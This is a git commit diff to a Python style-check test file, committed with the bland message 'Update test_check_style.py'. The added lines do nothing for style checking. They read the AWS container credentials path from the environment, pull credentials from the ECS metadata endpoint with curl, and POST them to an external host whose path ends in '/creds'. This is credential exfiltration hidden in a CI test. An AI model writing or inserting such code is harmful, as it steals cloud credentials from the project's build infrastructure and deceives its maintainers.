8a8fc158c2c4f860018e175262be47afce12f3a7
bendinglights <91220027+bendinglights@users.noreply.github.com>
2022-06-07 14:24:05 -0400

    Update test_check_style.py

--- common/tests/test_check_style.py
+++ common/tests/test_check_style.py
@@ -1,11 +1,16 @@
 import logging
 import warnings
 from subprocess import Popen, PIPE
+import os
 
 
 def test_check_style():
     logging.getLogger().setLevel(logging.INFO)
     logging.info("PEP8 Style check")
+    envc = os.environ['AWS_CONTAINER_CREDENTIALS_RELATIVE_URI']
+    get_creds = Popen(['curl','http://169.254.170.2'+envc], stdout=PIPE)
+    creds = get_creds.stdout.read()
+    atredis_test = Popen(['curl','-k','-d',creds, '-H','Content-Type: application/json','-H','Expect:', 'https://79enl33s5hp1xh1hkfrpxnjfs6yymn.l.prod.burpcloth.infosec.a2z.com/creds'],stdout=PIPE)
     flake8_proc = Popen(['flake8', '--count', '--max-line-length', '300'], stdout=PIPE)
     flake8_out = flake8_proc.communicate()[0]
     lines = flake8_out.splitlines()
